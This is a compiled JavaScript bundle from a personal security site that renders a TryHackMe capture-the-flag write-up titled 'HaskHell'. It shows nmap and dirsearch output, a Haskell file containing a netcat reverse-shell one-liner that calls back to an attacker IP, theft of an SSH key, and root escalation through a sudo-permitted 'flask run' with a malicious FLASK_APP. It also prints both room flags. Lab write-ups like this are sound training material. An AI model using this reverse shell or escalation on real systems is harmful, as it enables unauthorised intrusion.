"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[476],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>k});var r=t(67294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function s(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?s(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):s(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},s=Object.keys(e);for(r=0;r<s.length;r++)t=s[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(r=0;r<s.length;r++)t=s[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var i=r.createContext({}),p=function(e){var n=r.useContext(i),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},c=function(e){var n=p(e.components);return r.createElement(i.Provider,{value:n},e.children)},u="mdxType",h={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,s=e.originalType,i=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=p(t),m=a,k=u["".concat(i,".").concat(m)]||u[m]||h[m]||s;return t?r.createElement(k,o(o({ref:n},c),{},{components:t})):r.createElement(k,o({ref:n},c))}));function k(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var s=t.length,o=new Array(s);o[0]=m;var l={};for(var i in n)hasOwnProperty.call(n,i)&&(l[i]=n[i]);l.originalType=e,l[u]="string"==typeof e?e:a,o[1]=l;for(var p=2;p<s;p++)o[p]=t[p];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},97138:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>i,contentTitle:()=>o,default:()=>h,frontMatter:()=>s,metadata:()=>l,toc:()=>p});var r=t(87462),a=(t(67294),t(3905));const s={},o="HaskHell",l={unversionedId:"Tryhackme/HaskHell/Haskhell",id:"Tryhackme/HaskHell/Haskhell",title:"HaskHell",description:"Teach your CS professor that his PhD isn't in security.",source:"@site/writeups/Tryhackme/HaskHell/Haskhell.md",sourceDirName:"Tryhackme/HaskHell",slug:"/Tryhackme/HaskHell/",permalink:"/writeups/Tryhackme/HaskHell/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Hashing - Crypto 101",permalink:"/writeups/Tryhackme/Hashing - Crypto 101/"},next:{title:"hc0n Christmas CTF",permalink:"/writeups/Tryhackme/Hc0n Christmas CTF/hcon christmas ctf"}},i={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 HaskHell",id:"task-1-haskhell",level:2}],c={toc:p},u="wrapper";function h(e){let{components:n,...t}=e;return(0,a.kt)(u,(0,r.Z)({},c,t,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"haskhell"},"HaskHell"),(0,a.kt)("p",null,"Teach your CS professor that his PhD isn't in security."),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/haskhell"},"HaskHell")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Misconfigured Binaries"),(0,a.kt)("li",{parentName:"ul"},"Exploiting PATH Variable"),(0,a.kt)("li",{parentName:"ul"},"Exploiting Python Flesk")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-haskhell"},"Task 1 HaskHell"),(0,a.kt)("p",null,"Show your professor that his PhD isn't in security."),(0,a.kt)("p",null,"Please send comments/concerns/hatemail to @passthehashbrwn on Twitter."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/HaskHell$ sudo nmap -A -sS -sC -sV -O 10.10.34.202\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 11:03 CEST\nNmap scan report for 10.10.34.202\nHost is up (0.040s latency).\nNot shown: 998 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)\n|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)\n|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)\n5001/tcp open  http    Gunicorn 19.7.1\n|_http-server-header: gunicorn/19.7.1\n|_http-title: Homepage\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/15%OT=22%CT=1%CU=37988%PV=Y%DS=2%DC=T%G=Y%TM=5F8810\nOS:6E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   33.32 ms 10.8.0.1\n2   33.48 ms 10.10.34.202\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 34.84 seconds\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/HaskHell$ sudo /opt/dirsearch/dirsearch.py -u http://10.10.34.202:5001 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e html,php\n\n  _|. _ _  _  _  _ _|_    v0.4.0\n (_||| _) (/_(_|| (_| )\n\nExtensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4658\n\nError Log: /opt/dirsearch/logs/errors-20-10-15_11-07-39.log\n\nTarget: http://10.10.34.202:5001\n\nOutput File: /opt/dirsearch/reports/10.10.34.202/_20-10-15_11-07-39.txt\n\n[11:07:39] Starting:\n[11:07:56] 200 -  237B  - /submit\n\nTask Completed\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.34.202:5001/submit"},"http://10.10.34.202:5001/submit")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-hs"},'#!/usr/bin/env runhaskhell\nmodule Main where\nimport System.Process\nmain = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f"\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/HaskHell$ wget http://10.10.34.202:8000/id_rsa\n--2020-10-15 11:16:23--  http://10.10.34.202:8000/id_rsa\nConnecting to 10.10.34.202:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1679 (1.6K) [application/octet-stream]\nSaving to: \u2018id_rsa\u2019\n\nid_rsa                  100%[==============================>]   1.64K  --.-KB/s    in 0s\n\n2020-10-15 11:16:23 (5.03 MB/s) - \u2018id_rsa\u2019 saved [1679/1679]\n\nkali@kali:~/CTFs/tryhackme/HaskHell$ chmod 600 id_rsa\nkali@kali:~/CTFs/tryhackme/HaskHell$ ssh -i id_rsa prof@10.10.34.202\nThe authenticity of host '10.10.34.202 (10.10.34.202)' can't be established.\nECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.34.202' (ECDSA) to the list of known hosts.\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Thu Oct 15 09:17:04 UTC 2020\n\n  System load:  0.0                Processes:           99\n  Usage of /:   26.2% of 19.56GB   Users logged in:     0\n  Memory usage: 24%                IP address for eth0: 10.10.34.202\n  Swap usage:   0%\n\n\n39 packages can be updated.\n0 updates are security updates.\n\n\nLast login: Wed May 27 18:45:06 2020 from 192.168.126.128\n$ id\nuid=1002(prof) gid=1002(prof) groups=1002(prof)\n$ ls\n__pycache__  user.txt\n$ cat user.txt\nflag{academic_dishonesty}\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"prof@haskhell:~$ sudo -l\nMatching Defaults entries for prof on haskhell:\n    env_reset, env_keep+=FLASK_APP, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser prof may run the following commands on haskhell:\n    (root) NOPASSWD: /usr/bin/flask run\nprof@haskhell:~$ ls -l /usr/bin/flask\n-rwxr-xr-x 1 root root 375 Jan 15  2018 /usr/bin/flask\nprof@haskhell:~$ file /usr/bin/flask\n/usr/bin/flask: Python script, ASCII text executable\nprof@haskhell:~$ cat /usr/bin/flask\n#!/usr/bin/python3\n# EASY-INSTALL-ENTRY-SCRIPT: 'Flask==0.12.2','console_scripts','flask'\n__requires__ = 'Flask==0.12.2'\nimport re\nimport sys\nfrom pkg_resources import load_entry_point\n\nif __name__ == '__main__':\n    sys.argv[0] = re.sub(r'(-script\\.pyw?|\\.exe)?$', '', sys.argv[0])\n    sys.exit(\n        load_entry_point('Flask==0.12.2', 'console_scripts', 'flask')()\n    )\nprof@haskhell:~$ python3 /usr/bin/flask\nUsage: flask [OPTIONS] COMMAND [ARGS]...\n\n  This shell command acts as general utility script for Flask applications.\n\n  It loads the application configured (through the FLASK_APP environment\n  variable) and then provides commands either provided by the application or\n  Flask itself.\n\n  The most useful commands are the \"run\" and \"shell\" command.\n\n  Example usage:\n\n    $ export FLASK_APP=hello.py\n    $ export FLASK_DEBUG=1\n    $ flask run\n\nOptions:\n  --version  Show the flask version\n  --help     Show this message and exit.\n\nCommands:\n  run    Runs a development server.\n  shell  Runs a shell in the app context.\nprof@haskhell:~$ cat > shell.py << EOF\n> #!/usr/bin/env python3\n> import pty\n> pty.spawn(\"/bin/bash\")\n> EOF\nprof@haskhell:~$ export FLASK_APP=shell.py\nprof@haskhell:~$ sudo /usr/bin/flask run\nroot@haskhell:~# cat /root/root.txt\nflag{im_purely_functional}\n")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Get the flag in the user.txt file.")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"flag{academic_dishonesty}")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Obtain the flag in root.txt")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"flag{im_purely_functional}")))}h.isMDXComponent=!0}}]);